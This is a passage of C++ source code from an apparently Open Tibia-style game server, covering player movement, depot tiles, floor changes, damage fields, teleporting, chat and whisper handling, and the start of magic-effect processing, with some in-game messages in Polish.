    {
        if (playerMoving->access < g_config.ACCESS_HOUSE &&
                toTile->getHouse()->getPlayerRights(playerMoving->getName()) == HOUSE_NONE)
        {
            playerMoving->sendTextMessage(MSG_SMALLINFO, "You are not invited.");
            playerMoving->sendCancelWalk();
            return;
        }
        else
            playerMoving->houseRightsChanged = false;	// if we are invited stop checking rights
    }
#endif //TLM_HOUSE_SYSTEM

    // *** Normal moving

    if(creatureMoving)
    {
        // we need to update the direction the player is facing to...
        // otherwise we are facing some problems in turning into the
        // direction we were facing before the movement
        // check y first cuz after a diagonal move we lock to east or west
        if (to_y < oldPos.y) creatureMoving->direction = NORTH;
        if (to_y > oldPos.y) creatureMoving->direction = SOUTH;
        if (to_x > oldPos.x) creatureMoving->direction = EAST;
        if (to_x < oldPos.x) creatureMoving->direction = WEST;
    }

    int32_t oldstackpos = fromTile->getThingStackPos(thing);
    if (fromTile->removeThing(thing))
    {
        toTile->addThing(thing);

        thing->pos.x = to_x;
        thing->pos.y = to_y;
        thing->pos.z = to_z;

        SpectatorVec list;
        SpectatorVec::iterator it;

        getSpectators(Range(oldPos, Position(to_x, to_y, to_z)), list);

#ifdef TRS_GM_INVISIBLE
        if(playerMoving && playerMoving->gmInvisible)
        {
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(playerMoving == (*it) || (*it)->access >= playerMoving->access)
                {
                    if(Player* p = dynamic_cast<Player*>(*it))
                    {
                        if(p->attackedCreature == creature->getID())
                        {
                            autoCloseAttack(p, creature);
                        }
#ifdef HUCZU_FOLLOW
                        if(p->followCreature == creature->getID())
                        {
                            autoCloseFollow(p, creature);
                        }
#endif
                        (*it)->onThingMove(creature, thing, &oldPos, oldstackpos, 1, 1);
                    }
                }
            }
        }
        else if(playerMoving && !playerMoving->gmInvisible)
        {
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(Player* p = dynamic_cast<Player*>(*it))
                {
                    if(p->attackedCreature == creature->getID())
                    {
                        autoCloseAttack(p, creature);
                    }
#ifdef HUCZU_FOLLOW
                    if(p->followCreature == creature->getID())
                    {
                        autoCloseFollow(p, creature);
                    }
#endif
                    (*it)->onThingMove(creature, thing, &oldPos, oldstackpos, 1, 1);
                }
            }
        }
        else
        {
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(Player* p = dynamic_cast<Player*>(*it))
                {
                    if(p->attackedCreature == creature->getID())
                    {
                        autoCloseAttack(p, creature);
                    }
#ifdef HUCZU_FOLLOW
                    if(p->followCreature == creature->getID())
                    {
                        autoCloseFollow(p, creature);
                    }
#endif
                    (*it)->onThingMove(creature, thing, &oldPos, oldstackpos, 1, 1);
                }
            }
        }
#else //TRS_GM_INVISIBLE
        //players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(Player* p = dynamic_cast<Player*>(*it))
            {
                if(p->attackedCreature == creature->getID())
                {
                    autoCloseAttack(p, creature);
                }
#ifdef HUCZU_FOLLOW
                if(p->followCreature == creature->getID())
                {
                    autoCloseFollow(p, creature);
                }
#endif
                (*it)->onThingMove(creature, thing, &oldPos, oldstackpos, 1, 1);
            }
        }
#endif //TRS_GM_INVISIBLE

        //none-players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(!dynamic_cast<Player*>(*it))
            {
                (*it)->onThingMove(creature, thing, &oldPos, oldstackpos, 1, 1);
            }
        }
        autoCloseTrade(item, true);

        if(playerMoving && toTile && fromTile)
        {
            actions.luaWalk(playerMoving,playerMoving->pos,toTile->ground->getID(),toTile->ground->getUniqueId(),toTile->ground->getActionId()); //CHANGE onWalk
            actions.luaWalkOff(playerMoving,oldPos,fromTile->ground->getID(),fromTile->ground->getUniqueId(),fromTile->ground->getActionId()); //CHANGE onWalk
        }

#ifdef FIXY
        if(playerMoving && toTile && fromTile && toTile->isPz() && fromTile->isPz() && (toTile->ground->getID() == 416 || toTile->ground->getID() == 426 || toTile->ground->getID() == 446 || toTile->ground->getID() == 549))
        {
            for(int32_t x = player->pos.x-1; x <= player->pos.x+1; x++)
            {
                for(int32_t y = player->pos.y-1; y <= player->pos.y+1; y++)
                {
                    Position DepotPos(x, y, player->pos.z);
                    Tile* tile = getTile(DepotPos);
                    ItemVector::const_iterator iit;
                    int32_t DepotStackpos = 999999;
                    for(iit = tile->topItems.begin(); iit != tile->topItems.end(); ++iit)
                    {
                        if((*iit)->getID() == 2589 || (*iit)->getID() == 2590 || (*iit)->getID() == 2591 || (*iit)->getID() == 2592)
                        {
                            DepotStackpos = tile->getThingStackPos(*iit);
                            break;
                        }
                    }
                    for(iit = tile->downItems.begin(); iit != tile->downItems.end(); ++iit)
                    {
                        if((*iit)->getID() == 2589 || (*iit)->getID() == 2590 || (*iit)->getID() == 2591 || (*iit)->getID() == 2592)
                        {
                            DepotStackpos = tile->getThingStackPos(*iit);
                            break;
                        }
                    }
                    if(DepotStackpos != 999999)
                    {
                        Item *depotItem = dynamic_cast<Item*>(getThing(DepotPos, DepotStackpos, player));
                        Container *depot = dynamic_cast<Container*>(depotItem);
                        Container *checkdepot = player->getDepot(depot->depot);
                        int32_t e = 0;
                        if(!checkdepot)  // depot doesnt exist
                        {
                            Container* newdp = new Container(2590);
                            Container* newdp2 = new Container(2594);
                            player->addDepot(newdp, depot->depot); //create the depot
                            Container *newdepot = player->getDepot(depot->depot);
                            newdepot->addItem(newdp2);
                            e = getDepot(newdepot, e);
                        }
                        else
                            e = getDepot(checkdepot, e);

                        std::stringstream s;
                        s << "Masz " << e;
                        if((e%100==22) || (e%100==23) || (e%100==24) || (e%100==32) || (e%100==33) || (e%100==34) || (e%100==42) || (e%100==43) || (e%100==44) || (e%100==52) || (e%100==53) || (e%100==54) || (e%100==62) || (e%100==63) || (e%100==64) || (e%100==72) || (e%100==73) || (e%100==74) || (e%100==82) || (e%100==83) || (e%100==84) || (e%100==92) || (e%100==93) || (e%100==94))
                            s << " przedmioty w depozycie.";
                        else if((e<=4)&&(e>=2))
                            s << " przedmioty w depozycie.";
                        else if(e==1)
                            s << " przedmiot w depozycie.";
                        else
                            s << " przedmiotów w depozycie.";
                        playerMoving->sendTextMessage(MSG_EVENT, s.str().c_str());
                    }
                }
            }
        }
#endif //FIXY
//depot tiles
        if(playerMoving && fromTile && toTile && player == playerMoving)
        {
            switch(toTile->ground->getID())
            {
            case 416:
            {
                toTile->removeThing(toTile->ground);
                toTile->addThing(new Item(417));
                creature->onTileUpdated(Position(to_x,to_y,to_z));
                break;
            }
            case 426:
            {
                toTile->removeThing(toTile->ground);
                toTile->addThing(new Item(425));
                creature->onTileUpdated(Position(to_x,to_y,to_z));
                break;
            }

            case 549:
            {
                toTile->removeThing(toTile->ground);
                toTile->addThing(new Item(550));
                creature->onTileUpdated(Position(to_x,to_y,to_z));
                break;
            }

            case 446:
            {
                toTile->removeThing(toTile->ground);
                toTile->addThing(new Item(447));
                creature->onTileUpdated(Position(to_x,to_y,to_z));
                break;
            }

            case 293:
            {
                toTile->removeThing(toTile->ground);
                toTile->addThing(new Item(294));
                creature->onTileUpdated(Position(to_x,to_y,to_z));
                teleport(playerMoving, Position(to_x,to_y,playerMoving->pos.z+1));
                break;
            }

            }
            switch(fromTile->ground->getID())
            {
            case 550:
            {
                fromTile->removeThing(fromTile->ground);
                fromTile->addThing(new Item(549));
                creature->onTileUpdated(Position(from_x,from_y,from_z));
                break;
            }
            case 417:
            {
                fromTile->removeThing(fromTile->ground);
                fromTile->addThing(new Item(416));
                creature->onTileUpdated(Position(from_x,from_y,from_z));
                break;
            }
            case 425:
            {
                fromTile->removeThing(fromTile->ground);
                fromTile->addThing(new Item(426));
                creature->onTileUpdated(Position(from_x,from_y,from_z));
                break;
            }
            case 447:
            {
                fromTile->removeThing(fromTile->ground);
                fromTile->addThing(new Item(446));
                creature->onTileUpdated(Position(from_x,from_y,from_z));
                break;
            }
            }
        }
//end depot tiles-+
        if (playerMoving)
        {
            if(playerMoving->attackedCreature != 0)
            {
                Creature* attackedCreature = getCreatureByID(creatureMoving->attackedCreature);
                if(attackedCreature)
                {
                    autoCloseAttack(playerMoving, attackedCreature);
                }
            }
            if(playerMoving->tradePartner != 0)
            {
                Player* tradePartner = getPlayerByID(playerMoving->tradePartner);
                if(tradePartner)
                {
                    if((std::abs(playerMoving->pos.x - tradePartner->pos.x) > 2) ||
                            (std::abs(playerMoving->pos.y - tradePartner->pos.y) > 2) || (playerMoving->pos.z != tradePartner->pos.z))
                    {
                        playerCloseTrade(playerMoving);
                    }
                }
            }
            //change level begin
            if(toTile->floorChangeDown())
            {
                Tile* downTile = getTile(to_x, to_y, to_z+1);
                if(downTile)
                {
                    //diagonal begin
                    if(downTile->floorChange(NORTH) && downTile->floorChange(EAST))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x-1, playerMoving->pos.y+1, playerMoving->pos.z+1));
                    }
                    else if(downTile->floorChange(NORTH) && downTile->floorChange(WEST))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x+1, playerMoving->pos.y+1, playerMoving->pos.z+1));
                    }
                    else if(downTile->floorChange(SOUTH) && downTile->floorChange(EAST))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x-1, playerMoving->pos.y-1, playerMoving->pos.z+1));
                    }
                    else if(downTile->floorChange(SOUTH) && downTile->floorChange(WEST))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x+1, playerMoving->pos.y-1, playerMoving->pos.z+1));
                    }
                    //diagonal end
                    else if(downTile->floorChange(NORTH))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x, playerMoving->pos.y+1, playerMoving->pos.z+1));
                    }
                    else if(downTile->floorChange(SOUTH))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x, playerMoving->pos.y-1, playerMoving->pos.z+1));
                    }
                    else if(downTile->floorChange(EAST))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x-1, playerMoving->pos.y, playerMoving->pos.z+1));
                    }
                    else if(downTile->floorChange(WEST))
                    {
                        teleport(playerMoving, Position(playerMoving->pos.x+1, playerMoving->pos.y, playerMoving->pos.z+1));
                    }
                    else   //allow just real tiles to be hole'like
                    {
                        // TODO: later can be changed to check for piled items like chairs, boxes
                        teleport(playerMoving, Position(playerMoving->pos.x, playerMoving->pos.y, playerMoving->pos.z+1));
                    }
                }
            }
            //diagonal begin
            else if(toTile->floorChange(NORTH) && toTile->floorChange(EAST))
            {
                teleport(playerMoving, Position(playerMoving->pos.x+1, playerMoving->pos.y-1, playerMoving->pos.z-1));
            }
            else if(toTile->floorChange(NORTH) && toTile->floorChange(WEST))
            {
                teleport(playerMoving, Position(playerMoving->pos.x-1, playerMoving->pos.y-1, playerMoving->pos.z-1));
            }
            else if(toTile->floorChange(SOUTH) && toTile->floorChange(EAST))
            {
                teleport(playerMoving, Position(playerMoving->pos.x+1, playerMoving->pos.y+1, playerMoving->pos.z-1));
            }
            else if(toTile->floorChange(SOUTH) && toTile->floorChange(WEST))
            {
                teleport(playerMoving, Position(playerMoving->pos.x-1, playerMoving->pos.y+1, playerMoving->pos.z-1));
            }
            //diagonal end
            else if(toTile->floorChange(NORTH))
            {
                teleport(playerMoving, Position(playerMoving->pos.x, playerMoving->pos.y-1, playerMoving->pos.z-1));
            }
            else if(toTile->floorChange(SOUTH))
            {
                teleport(playerMoving, Position(playerMoving->pos.x, playerMoving->pos.y+1, playerMoving->pos.z-1));
            }
            else if(toTile->floorChange(EAST))
            {
                teleport(playerMoving, Position(playerMoving->pos.x+1, playerMoving->pos.y, playerMoving->pos.z-1));
            }
            else if(toTile->floorChange(WEST))
            {
                teleport(playerMoving, Position(playerMoving->pos.x-1, playerMoving->pos.y, playerMoving->pos.z-1));
            }
            //change level end
        }
        if(toTile && playerMoving && playerMoving->access < g_config.ACCESS_PROTECT && !toTile->downItems.empty() || toTile && creatureMoving && creatureMoving->access < g_config.ACCESS_PROTECT && !toTile->downItems.empty())
        {
            ItemVector::iterator iit;
            for (iit = toTile->downItems.begin(); iit != toTile->downItems.end(); ++iit)
            {
                if(!(*iit)) continue;
                Item *item = dynamic_cast<Item*>(*iit);
                if(!item) continue;
                if(!creatureMoving || creatureMoving->isRemoved || creatureMoving->health <= 0) break;
                if (item->getID() == 1492 || item->getID() == 1423 || item->getID() == 1487) //Fire - Big
                {
                    doFieldDamage(creatureMoving,        199     , NM_ME_HITBY_FIRE, NM_ME_HITBY_FIRE, ATTACK_FIRE,  true,       20);
                    //                creature     DamageColor,    damageEffect,      hitEffect      attackType, offensive,   damage
                    if(creatureMoving && !creatureMoving->isRemoved && creatureMoving->health > 0)
                        CreateCondition(creatureMoving, NULL, 199, NM_ME_HITBY_FIRE, NM_ME_HITBY_FIRE, ATTACK_FIRE, true, 10, 10, 4000, 10);
                }
                else if(item->getID() == 1493 || item->getID() == 1424 || item->getID() == 1488) //Fire Medium
                {
                    doFieldDamage(creatureMoving, 199, NM_ME_HITBY_FIRE, NM_ME_HITBY_FIRE, ATTACK_FIRE, true, 10);
                    if(creatureMoving && !creatureMoving->isRemoved && creatureMoving->health > 0)
                        CreateCondition(creatureMoving, NULL, 199, NM_ME_HITBY_FIRE, NM_ME_HITBY_FIRE, ATTACK_FIRE, true, 10, 10, 4000, 10);
                }
                else if(item->getID() == 1495 || item->getID() == 1491) //Energy
                {
                    doFieldDamage(creatureMoving, 71, NM_ME_ENERGY_DAMAGE,  NM_ME_ENERGY_DAMAGE, ATTACK_ENERGY, true, 30);
                    if(creatureMoving && !creatureMoving->isRemoved && creatureMoving->health > 0)
                        CreateCondition(creatureMoving, NULL, 71, NM_ME_ENERGY_DAMAGE, NM_ME_ENERGY_DAMAGE, ATTACK_ENERGY, true, 30, 30, 4000, 3);
                }
                else if(item->getID() == 1496 || item->getID() == 1490) //Poison
                {
                    doFieldDamage(creatureMoving, 84, NM_ME_POISEN, NM_ME_POISEN, ATTACK_POISON, true, 10);
                    if(creatureMoving && !creatureMoving->isRemoved && creatureMoving->health > 0)
                        CreateCondition(creatureMoving, NULL, 84, NM_ME_POISEN, NM_ME_POISEN_RINGS, ATTACK_POISON, true, 10, 10, 4000, 10);
                }
                if(!creatureMoving || creatureMoving->isRemoved || creatureMoving->health <= 0)
                    break;
            }
        }
        // Magic Field in destiny field
        if(creatureMoving)
        {
            const MagicEffectItem* fieldItem = toTile->getFieldItem();

            if(fieldItem)
            {
                const MagicEffectTargetCreatureCondition *magicTargetCondition = fieldItem->getCondition();

                if(!(getWorldType() == WORLD_TYPE_NO_PVP && playerMoving && magicTargetCondition && magicTargetCondition->getOwnerID() != 0))
                {
                    fieldItem->getDamage(creatureMoving);
                }

                if(magicTargetCondition && ((magicTargetCondition->attackType == ATTACK_FIRE) ||
                                            (magicTargetCondition->attackType == ATTACK_POISON) ||
                                            (magicTargetCondition->attackType == ATTACK_ENERGY)))
                {
                    Creature *c = getCreatureByID(magicTargetCondition->getOwnerID());
                    creatureMakeMagic(c, thing->pos, magicTargetCondition);
                }
            }
        }
    }
}
void Game::getSpectators(const Range& range, SpectatorVec& list)
{
    map->getSpectators(range, list);
}

void Game::creatureTurn(Creature *creature, Direction dir)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureTurn()");

    if (creature->direction != dir)
    {
        creature->direction = dir;

        int32_t stackpos = map->getTile(creature->pos)->getThingStackPos(creature);

        SpectatorVec list;
        SpectatorVec::iterator it;

        map->getSpectators(Range(creature->pos, true), list);

        //players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(dynamic_cast<Player*>(*it))
            {
                (*it)->onCreatureTurn(creature, stackpos);
            }
        }

        //none-players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(!dynamic_cast<Player*>(*it))
            {
                (*it)->onCreatureTurn(creature, stackpos);
            }
        }
    }
}

void Game::addCommandTag(std::string tag)
{
    bool found = false;
    for(size_t i=0; i< commandTags.size() ; i++)
    {
        if(commandTags[i] == tag)
        {
            found = true;
            break;
        }
    }
    if(!found)
    {
        commandTags.push_back(tag);
    }
}

void Game::resetCommandTag()
{
    commandTags.clear();
}

void Game::creatureSay(Creature *creature, SpeakClasses type, const std::string &text)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureSay()");

    bool GMcommand = false;
// First, check if this was a GM command

    for(size_t i=0; i< commandTags.size() ; i++)
    {
        if(commandTags[i] == text.substr(0,1))
        {
            if(commands.exeCommand(creature,text))
            {
                GMcommand = true;
            }
            break;
        }
    }
    if(!GMcommand)
    {
        Player* player = dynamic_cast<Player*>(creature);
        if (player)
            checkSpell(player, type, text);

        // It was no command, or it was just a player
        SpectatorVec list;
        SpectatorVec::iterator it;

        getSpectators(Range(creature->pos), list);

        //players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(dynamic_cast<Player*>(*it))
            {
                (*it)->onCreatureSay(creature, type, text);
            }
        }

        //none-players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(!dynamic_cast<Player*>(*it))
            {
                (*it)->onCreatureSay(creature, type, text);
            }
        }
    }
}

void Game::teleport(Thing *thing, const Position& newPos)
{

    if(newPos == thing->pos)
        return;

    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::teleport()");

    //Tile *toTile = getTile( newPos.x, newPos.y, newPos.z );
    Tile *toTile = map->getTile(newPos);
    if(toTile)
    {
        Creature *creature = dynamic_cast<Creature*>(thing);
        if(creature)
        {
            //Tile *fromTile = getTile( thing->pos.x, thing->pos.y, thing->pos.z );
            Tile *fromTile = map->getTile(thing->pos);
            if(!fromTile)
                return;

            int32_t osp = fromTile->getThingStackPos(thing);
            if(!fromTile->removeThing(thing))
                return;

            toTile->addThing(thing);
            Position oldPos = thing->pos;

            SpectatorVec list;
            SpectatorVec::iterator it;

            getSpectators(Range(thing->pos, true), list);

            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(Player* p = dynamic_cast<Player*>(*it))
                {
                    if(p->attackedCreature == creature->getID())
                    {
                        autoCloseAttack(p, creature);
                    }
#ifdef HUCZU_FOLLOW
                    if(p->followCreature == creature->getID())
                    {
                        autoCloseFollow(p, creature);
                    }
#endif
                    (*it)->onCreatureDisappear(creature, osp, true);
                }
            }

            //none-players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(!dynamic_cast<Player*>(*it))
                {
                    (*it)->onCreatureDisappear(creature, osp, true);
                }
            }

            if(newPos.y < oldPos.y)
                creature->direction = NORTH;
            if(newPos.y > oldPos.y)
                creature->direction = SOUTH;
            if(newPos.x > oldPos.x && (std::abs(newPos.x - oldPos.x) >= std::abs(newPos.y - oldPos.y)) )
                creature->direction = EAST;
            if(newPos.x < oldPos.x && (std::abs(newPos.x - oldPos.x) >= std::abs(newPos.y - oldPos.y)))
                creature->direction = WEST;

            thing->pos = newPos;

            Player *player = dynamic_cast<Player*>(creature);
            if(player && player->attackedCreature != 0)
            {
                Creature* attackedCreature = getCreatureByID(player->attackedCreature);
                if(attackedCreature)
                {
                    autoCloseAttack(player, attackedCreature);
                }
            }
#ifdef HUCZU_FOLLOW
            if(player && player->followCreature != 0)
            {
                Creature* followedCreature = getCreatureByID(player->followCreature);
                if(followedCreature)
                {
                    autoCloseFollow(player, followedCreature);
                }
            }
#endif
            list.clear();
            getSpectators(Range(thing->pos, true), list);

#ifdef TRS_GM_INVISIBLE
            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(player)
                {
                    if (player->gmInvisible && player == (*it))
                    {
                        if(Player* p = dynamic_cast<Player*>(*it))
                        {
                            if(p->attackedCreature == creature->getID())
                            {
                                autoCloseAttack(p, creature);
                            }
#ifdef HUCZU_FOLLOW
                            if(p->followCreature == creature->getID())
                            {
                                autoCloseFollow(p, creature);
                            }
#endif
                            (*it)->onTeleport(creature, &oldPos, osp);
                        }
                    }
                    else if (player->gmInvisible && player != (*it) && (*it)->access < player->access)
                    {
                        // Nothing Because he is invisible...
                    }
                    else
                    {
                        if(Player* p = dynamic_cast<Player*>(*it))
                        {
                            if(p->attackedCreature == creature->getID())
                            {
                                autoCloseAttack(p, creature);
                            }
#ifdef HUCZU_FOLLOW
                            if(p->followCreature == creature->getID())
                            {
                                autoCloseFollow(p, creature);
                            }
#endif
                            (*it)->onTeleport(creature, &oldPos, osp);
                        }
                    }
                }
                else
                    creatureBroadcastTileUpdated(newPos);
            }
#else //TRS_GM_INVISIBLE
            //players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(Player* p = dynamic_cast<Player*>(*it))
                {
                    if(p->attackedCreature == creature->getID())
                    {
                        autoCloseAttack(p, creature);
                    }
#ifdef HUCZU_FOLLOW
                    if(p->followCreature == creature->getID())
                    {
                        autoCloseFollow(p, creature);
                    }
#endif
                    (*it)->onTeleport(creature, &oldPos, osp);
                }
            }
#endif //TRS_GM_INVISIBLE

            //none-players
            for(it = list.begin(); it != list.end(); ++it)
            {
                if(!dynamic_cast<Player*>(*it))
                {
                    (*it)->onTeleport(creature, &oldPos, osp);
                }
            }
        }
        else
        {
            if(removeThing(NULL, thing->pos, thing, false))
            {
                addThing(NULL,newPos,thing);
            }
        }
    }//if(toTile)

}


void Game::creatureChangeOutfit(Creature *creature)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureChangeOutfit()");

    SpectatorVec list;
    SpectatorVec::iterator it;

    getSpectators(Range(creature->pos, true), list);

    //players
    for(it = list.begin(); it != list.end(); ++it)
    {
        if(dynamic_cast<Player*>(*it))
        {
            (*it)->onCreatureChangeOutfit(creature);
        }
    }

    //none-players
    for(it = list.begin(); it != list.end(); ++it)
    {
        if(!dynamic_cast<Player*>(*it))
        {
            (*it)->onCreatureChangeOutfit(creature);
        }
    }
}

void Game::creatureWhisper(Creature *creature, const std::string &text)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureWhisper()");

    SpectatorVec list;
    SpectatorVec::iterator it;

    getSpectators(Range(creature->pos), list);

    //players
    for(it = list.begin(); it != list.end(); ++it)
    {
        if(dynamic_cast<Player*>(*it))
        {
            if(abs(creature->pos.x - (*it)->pos.x) > 1 || abs(creature->pos.y - (*it)->pos.y) > 1)
                (*it)->onCreatureSay(creature, SPEAK_WHISPER, std::string("pspsps"));
            else
                (*it)->onCreatureSay(creature, SPEAK_WHISPER, text);
        }
    }

    //none-players
    for(it = list.begin(); it != list.end(); ++it)
    {
        if(!dynamic_cast<Player*>(*it))
        {
            if(abs(creature->pos.x - (*it)->pos.x) > 1 || abs(creature->pos.y - (*it)->pos.y) > 1)
                (*it)->onCreatureSay(creature, SPEAK_WHISPER, std::string("pspsps"));
            else
                (*it)->onCreatureSay(creature, SPEAK_WHISPER, text);
        }
    }
}

void Game::creatureYell(Creature *creature, std::string &text)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureYell()");
    Player* player = dynamic_cast<Player*>(creature);
#ifdef FIXY
    if(player && player->level < 2 && player->access < 2)
    {
        player->sendTextMessage(MSG_SMALLINFO, "Nie mozesz krzyczec.");
        return;
    }
#endif //FIXY

    if (player && player->access < g_config.ACCESS_PROTECT && player->exhaustedTicks >= 1000)
    {
        player->exhaustedTicks += g_config.EXHAUSTED_ADD;
        player->sendTextMessage(MSG_SMALLINFO, "You are exhausted.");
    }
    else
    {
        creature->exhaustedTicks = g_config.EXHAUSTED;
        std::transform(text.begin(), text.end(), text.begin(), upchar);

        SpectatorVec list;
        SpectatorVec::iterator it;

        getSpectators(Range(creature->pos, 18, 18, 14, 14), list);

        //players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(dynamic_cast<Player*>(*it))
            {
                (*it)->onCreatureSay(creature, SPEAK_YELL, text);
            }
        }

        //none-players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(!dynamic_cast<Player*>(*it))
            {
                (*it)->onCreatureSay(creature, SPEAK_YELL, text);
            }
        }
    }
}

void Game::creatureSpeakTo(Creature *creature, SpeakClasses type,const std::string &receiver, const std::string &text)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureSpeakTo");
    Player* player = dynamic_cast<Player*>(creature);
    if(!player)
        return;

    Player* toPlayer = getPlayerByName(receiver);
    if(!toPlayer)
    {
        player->sendTextMessage(MSG_SMALLINFO, "Gracz o tym nicku jest offline.");
        return;
    }
    if(toPlayer->access >= 1 && player->access == 0 && !g_config.GM_MSG)
    {
        player->sendTextMessage(MSG_SMALLINFO, "Nie mozesz wyslac wiadomosci do czlonka ekipy.");
        return;
    }
    if(creature->access < g_config.ACCESS_TALK)
    {
        type = SPEAK_PRIVATE;
    }
    toPlayer->onCreatureSay(creature, type, text);

    std::stringstream ss;
    ss << "Wiadomosc wyslana do " << toPlayer->getName() << ".";
    player->sendTextMessage(MSG_SMALLINFO, ss.str().c_str());

}
void Game::creatureTalkToChannel(Player *player, SpeakClasses type, std::string &text, uint16_t channelId)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureTalkToChannel");

    switch(player->access)
    {
    case 0:
        type = SPEAK_CHANNEL_Y;
        break;
    case 1:
        type = SPEAK_CHANNEL_O;
        break;
    case 2:
    case 3:
    case 4:
    case 5:
        type = SPEAK_CHANNEL_R1;
        break;
    default:
        type = SPEAK_CHANNEL_Y;
        break;
    }
#ifdef HUCZU_SERVER_LOG
    if(player && channelId == 0x02)
        return;
#endif
#ifdef FIXY
    if(player && (commands.exeCommand(player,text) || channelId == 0x01 || channelId == 0x06))
        return;
#endif //FIXY
    g_chat.talkToChannel(player, type, text, channelId);
}

void Game::creatureSendToSpecialChannel(Player *player, SpeakClasses type, const std::string &text, uint16_t channelId, const std::string &info, bool alone /*=true*/)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureSendToSpecialChannel");

    g_chat.sendSpecialMsgToChannel(player, type, text, channelId, info, alone);
}

void Game::creatureMonsterYell(Monster* monster, const std::string& text)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureMonsterYell()");

    SpectatorVec list;
    SpectatorVec::iterator it;

    map->getSpectators(Range(monster->pos, 18, 18, 14, 14), list);

    //players
    for(it = list.begin(); it != list.end(); ++it)
    {
        if(dynamic_cast<Player*>(*it))
        {
            (*it)->onCreatureSay(monster, SPEAK_MONSTER1, text);
        }
    }
}

void Game::creatureBroadcastMessage(Creature *creature, const std::string &text)
{
    /*if(creature->access < g_config.ACCESS_TALK)
    	return;*/

    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureBroadcastMessage()");

    for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
    {
        (*it).second->onCreatureSay(creature, SPEAK_BROADCAST, text);
    }
}

/** \todo Someone _PLEASE_ clean up this mess */
bool Game::creatureMakeMagic(Creature *creature, const Position& centerpos, const MagicEffectClass* me)
{

    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureMakeMagic()");

#ifdef __DEBUG__
    cout << "creatureMakeMagic: " << (creature ? creature->getName() : "No name") << ", x: " << centerpos.x << ", y: " << centerpos.y << ", z: " << centerpos.z << std::endl;
#endif

    Position frompos;

    if(creature)
    {
        frompos = creature->pos;

        if(!creatureOnPrepareMagicAttack(creature, centerpos, me))
        {
            return false;
        }
    }
    else
    {
        frompos = centerpos;
    }

    MagicAreaVec tmpMagicAreaVec;
    me->getArea(centerpos, tmpMagicAreaVec);

    std::vector<Position> poslist;

    Position topLeft(0xFFFF, 0xFFFF, frompos.z), bottomRight(0, 0, frompos.z);

    //Filter out the tiles we actually can work on
    for(MagicAreaVec::iterator maIt = tmpMagicAreaVec.begin(); maIt != tmpMagicAreaVec.end(); ++maIt)
    {
        Tile *t = map->getTile(maIt->x, maIt->y, maIt->z);
        if(t && (!creature || (creature->access >= g_config.ACCESS_PROTECT || !me->offensive || !t->isPz()) ) )
        {
            if((t->isBlocking(BLOCK_PROJECTILE) == RET_NOERROR) && (me->isIndirect() ||
                    //(map->canThrowItemTo(frompos, (*maIt), false, true) && !t->floorChange()))) {
                    ((map->canThrowObjectTo(centerpos, (*maIt), BLOCK_PROJECTILE) == RET_NOERROR) && !t->floorChange())))
            {

                if(maIt->x < topLeft.x)
                    topLeft.x = maIt->x;

                if(maIt->y < topLeft.y)
                    topLeft.y = maIt->y;

                if(maIt->x > bottomRight.x)
                    bottomRight.x = maIt->x;

                if(maIt->y > bottomRight.y)
                    bottomRight.y = maIt->y;

                poslist.push_back(*maIt);
            }
        }
    }

    topLeft.z = frompos.z;
    bottomRight.z = frompos.z;

    if(topLeft.x == 0xFFFF || topLeft.y == 0xFFFF || bottomRight.x == 0 || bottomRight.y == 0)
    {

        return false;
    }

#ifdef __DEBUG__
    printf("top left %d %d %d\n", topLeft.x, topLeft.y, topLeft.z);
    printf("bottom right %d %d %d\n", bottomRight.x, bottomRight.y, bottomRight.z);
#endif

    //We do all changes against a GameState to keep track of the changes,
    //need some more work to work for all situations...
    GameState gamestate(this, Range(topLeft, bottomRight));

    //Tile *targettile = getTile(centerpos.x, centerpos.y, centerpos.z);
    Tile *targettile = map->getTile(centerpos);
    bool bSuccess = false;
    bool hasTarget = false;
    bool isBlocking = true;
    if(targettile)
    {
        hasTarget = !targettile->creatures.empty();
        isBlocking = (targettile->isBlocking(BLOCK_SOLID, true) != RET_NOERROR);
    }

    if(targettile && me->canCast(isBlocking, !targettile->creatures.empty()))
    {
        bSuccess = true;

        //Apply the permanent effect to the map
        std::vector<Position>::const_iterator tlIt;
        for(tlIt = poslist.begin(); tlIt != poslist.end(); ++tlIt)
        {
            gamestate.onAttack(creature, Position(*tlIt), me);
        }
    }

    SpectatorVec spectatorlist = gamestate.getSpectators();
    SpectatorVec::iterator it;

    for(it = spectatorlist.begin(); it != spectatorlist.end(); ++it)
    {
